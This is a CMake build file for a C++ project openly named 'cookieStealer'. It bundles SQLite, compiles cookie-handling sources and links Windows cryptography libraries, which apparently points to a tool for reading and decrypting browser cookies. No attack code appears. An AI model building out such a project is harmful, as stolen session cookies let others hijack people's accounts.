cmake_minimum_required(VERSION 3.29)
project(cookieStealer)

set(CMAKE_CXX_STANDARD 17)

FILE(GLOB COMMON_HEADERS tools/sqlite3/*.h)
FILE(GLOB COMMON_SOURCES tools/sqlite3/*.c)

add_executable(cookieStealer
        main.cpp
        ${COMMON_HEADERS}
        ${COMMON_SOURCES}
        tools/cookies.h
        tools/cookies.cpp
        tools/TypeUtil.cpp
        tools/TypeUtil.h
)

target_include_directories(cookieStealer PRIVATE tools)

target_link_libraries(cookieStealer
        crypt32
        bcrypt
)